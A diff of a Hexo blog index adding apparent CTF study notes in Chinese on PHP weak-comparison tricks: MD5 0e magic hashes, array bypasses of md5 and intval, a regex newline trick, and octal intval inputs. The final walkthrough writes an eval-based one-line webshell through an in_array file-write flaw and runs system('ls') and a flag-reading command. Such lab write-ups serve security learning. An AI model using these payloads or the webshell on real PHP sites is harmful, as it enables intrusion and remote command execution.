@@ -71,6 +71,198 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-md5强弱碰撞及绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/23/md5%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E%E5%8F%8A%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="dt-published" datetime="2025-04-23T06:37:08.000Z" itemprop="datePublished">2025-04-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/23/md5%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E%E5%8F%8A%E7%BB%95%E8%BF%87/">md5强弱碰撞及绕过</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="1-弱比较"><a href="#1-弱比较" class="headerlink" title="1.弱比较"></a>1.弱比较</h2><p>a和b两个值不直接相等，但通过md5后相等</p>
+<p>用0e科学计数法绕过，0exxx 会被看成0的多少次方，结果为零</p>
+<p>240610708:0e462097431906509019562988736854<br>QLTHNDT:0e405967825401955372549139051580<br>QNKCDZO:0e830400451993494058024219903391<br>PJNPDWY:0e291529052894702774557631701704<br>NWWKITQ:0e763082070976038347657360817689<br>NOOPCJF:0e818888003657176127862245791911<br>MMHUWUV:0e701732711630150438129209816536<br>MAUXXQC:0e478478466848439040434801845361</p>
+<h2 id="2-强比较"><a href="#2-强比较" class="headerlink" title="2.强比较"></a>2.强比较</h2><p>要先判断字符串类型是否相同再判断值</p>
+<p>用数组绕过 md5不能加密数组，在加密数组的时候会返回NULL，如果设置没有判断变量类型或内容，就可以使用，因此，强弱比较都是可以使用数组绕过的。</p>
+<p>a[]&#x3D;1&amp;b[]&#x3D;2</p>
+<h2 id="3-真实碰撞对"><a href="#3-真实碰撞对" class="headerlink" title="3.真实碰撞对"></a>3.真实碰撞对</h2><p>值不相等，通过md5后值相等</p>
+<p>0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef</p>
+<p>和0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/04/23/md5%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E%E5%8F%8A%E7%BB%95%E8%BF%87/" data-id="cm9tpbobu0000bwuoairnae9v" data-title="md5强弱碰撞及绕过" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-php特性" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/23/php%E7%89%B9%E6%80%A7/" class="article-date">
+  <time class="dt-published" datetime="2025-04-23T02:21:55.000Z" itemprop="datePublished">2025-04-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/23/php%E7%89%B9%E6%80%A7/">php特性</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="89">
+<li></li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-intval-function.html">intval函数(获取变量的整数型)</a>：如果他的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0</p>
+<p><strong>payload：?num[]&#x3D;1</strong></p>
+<ol start="91">
+<li></li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个匹配 ^表示开始 $表示结束 i表示不区分大小写 <code>m</code>表示多行模式逐行检查，只要有一行满足以<code>php</code>开头并以<code>php</code>结尾（不区分大小写），就会匹配成功。而<code>/^php$/i</code>只进行单行匹配</p>
+<p>？cmd&#x3D;php%0Aphp 这样多行 存在有php 符合第一个 但第二个匹配 整体被看成一行 不满足</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>93.要表示数字4476 不能直接&#x3D;4476 intval转换成整数后为4476 过滤了字母 不能用16进制0x 可以用八进制 以0开头 ?num&#x3D;010574 还可以用小数 ?num&#x3D;4476.1</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>94.<code>strpos</code>函数用于查找一个字符串在另一个字符串中首次出现的位置 这里表示从num变量中查找“0”的位置，必须要有0且0不能在第一位，如果 <code>0</code> 在第一个位置，<code>strpos($num, &quot;0&quot;)</code> 会返回 <code>0</code> ，经过逻辑非运算后条件成立，就会执行 <code>die(&quot;no no no!&quot;)</code> 终止脚本执行</p>
+<p>用八进制？num&#x3D;+01057</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="97">
+<li>用数组绕过md5 md5对数组是不予加密的，但是这个函数是返回值类型的，没有返回对象，便是返回null（null是无对象的意思，可以理解为没有目标）,所以两个都是null，可以绕过里面的比较，但是外面还有一个a!&#x3D;b,绕过姿势为：?a[]&#x3D;1&amp;b[]&#x3D;2</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>三元运算符</p>
+<p>类型 变量名 &#x3D; (条件表达式)? 表达式1:表达式2；<br>（）括号内进行逻辑运算，结果为boolean值，当值为true时返回表达式1的值给左边的变量，当括号内值为false时则返回表达式2的值给左边的变量。<br>注意：<br>1、表达式1与表达式2的类型要求是一致的，左边的变量名不要求一致，可以通过强制转换达到变换类型的目的。<br>2、三元运算可以嵌套使用，表达式1可以是一个新的三元运算，只要其返回值类型与表达式2一致即可。<br>3、凡是三元运算均可以转换为if-else，但是反过来不一定可以。</p>
+<p>post传入给了get get里面不能有flag，否则被替换成COOKIE,SERVER,所以直接post上传一个HTTP_FLAG&#x3D;flag 这样就传给了get 最终显示$flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">  <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>99.0x36d 16进制转换为10进制为877，执行一次i加一</p>
+<ul>
+<li><p><code>array_push</code> 函数用于把一个或多个元素添加到数组的末尾。</p>
+</li>
+<li><p><code>rand(1, $i)</code> 是一个随机数生成函数，会生成一个介于 1 到 <code>$i</code> 之间（包含 1 和 <code>$i</code>）的随机整数。</p>
+<p>把每次生成的随机数添加到 <code>$allow</code> 数组的末尾。</p>
+</li>
+<li><p><code>isset($_GET[&#39;n&#39;])</code> 用于检查通过 GET 请求传递的参数 <code>n</code> 是否存在。</p>
+</li>
+<li><p><code>in_array($_GET[&#39;n&#39;], $allow)</code> 用于检查 <code>$_GET[&#39;n&#39;]</code> 的值是否存在于 <code>$allow</code> 数组中。</p>
+</li>
+<li><p>只有当这两个条件都满足时，才会执行花括号内的代码。</p>
+</li>
+<li><p><code>file_put_contents</code> 是一个用于将数据写入文件的函数。</p>
+</li>
+<li><p><code>$_GET[&#39;n&#39;]</code> 是用户通过 GET 请求传递的文件名。</p>
+</li>
+<li><p><code>$_POST[&#39;content&#39;]</code> 是用户通过 POST 请求传递的文件内容。</p>
+<p>把 <code>$_POST[&#39;content&#39;]</code> 的内容写入到以 <code>$_GET[&#39;n&#39;]</code> 命名的文件中。</p>
+<h2 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h2></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool in_array (mixed $needle, array $haystack [, bool $strict = FALSE])</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong><code>$needle</code></strong>：要在数组中搜索的值，数据类型可以是任意类型。比如字符串、数字、数组等。</p>
+</li>
+<li><p><strong><code>$haystack</code></strong>：要进行搜索的目标数组，是必需参数 。</p>
+</li>
+<li><p><strong><code>$strict</code></strong>：可选参数，默认值为 <code>FALSE</code>。若设为 <code>TRUE</code>，函数会在判断值是否存在的同时，严格比较数据类型，要求值和类型都与数组中的元素完全匹配才认为存在。</p>
+<p>in_array() 函数存在弱比较的漏洞，如果没有设置第三个参数，in_array() 函数在比较时默认是弱类型比较，这意味着它会进行自动类型转换。例如数组中的元素是整数，而搜索的值是字符串，PHP 会尝试将字符串转换为整数来进行比较。1.php 就自动转换为了整数 1，也就符合在数组中的条件。</p>
+<p>?n&#x3D;1.php 这样in_array()函数比较时转换成1，而1一定在$allow中，然后post上传一个一句话木马 ，再传给了n，</p>
+<p>post  content&#x3D;&lt;?eval ($_post[‘a’])</p>
+</li>
+</ul>
+<p>再访问这个一句话木马文件 1.php 再post执行命令a&#x3D;system(‘ls’)</p>
+<p>再抓取文件a&#x3D;system(‘tac flag36d.php’)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/04/23/php%E7%89%B9%E6%80%A7/" data-id="cm9tpbobv0001bwuof58pfs5t" data-title="php特性" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-phptexing" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/23/phptexing/" class="article-date">
+  <time class="dt-published" datetime="2025-04-23T02:21:38.000Z" itemprop="datePublished">2025-04-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/23/phptexing/">phptexing</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/04/23/phptexing/" data-id="cm9tpbobw0002bwuo1ldw351a" data-title="phptexing" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-requests库的学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="article-date">
@@ -537,45 +729,6 @@
 
 
   
-    <article id="post-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/04/13/blog/" class="article-date">
-  <time class="dt-published" datetime="2025-04-13T06:59:17.000Z" itemprop="datePublished">2025-04-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/04/13/blog/">blog</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>22222</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/13/blog/" data-id="cm9qgphql000000uo212o29lw" data-title="blog" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
     <article id="post-My-New-Blog-Post" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/04/09/My-New-Blog-Post/" class="article-date">
@@ -615,58 +768,12 @@
 
 
   
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/04/07/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2025-04-07T12:44:16.882Z" itemprop="datePublished">2025-04-07</time>
-</a>
+
+
+  <nav id="page-nav">
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/04/07/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/07/hello-world/" data-id="cm9qgphqr000800uobu8gcfh3" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -697,23 +804,23 @@
       <ul>
         
           <li>
+            <a href="/2025/04/23/md5%E5%BC%BA%E5%BC%B1%E7%A2%B0%E6%92%9E%E5%8F%8A%E7%BB%95%E8%BF%87/">md5强弱碰撞及绕过</a>
+          </li>
+        
+          <li>
+            <a href="/2025/04/23/php%E7%89%B9%E6%80%A7/">php特性</a>
+          </li>
+        
+          <li>
+            <a href="/2025/04/23/phptexing/">phptexing</a>
+          </li>
+        
+          <li>
             <a href="/2025/04/21/requests%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/">requests库的学习</a>
           </li>
         
           <li>
             <a href="/2025/04/13/ctfshow29-52/">ctfshow29-52</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/13/ctfshow%20web29-52%20(%E9%83%A8%E5%88%86%EF%BC%89/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/13/ctfshow%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/13/robots.txt/">信息收集</a>
           </li>
         
       </ul>
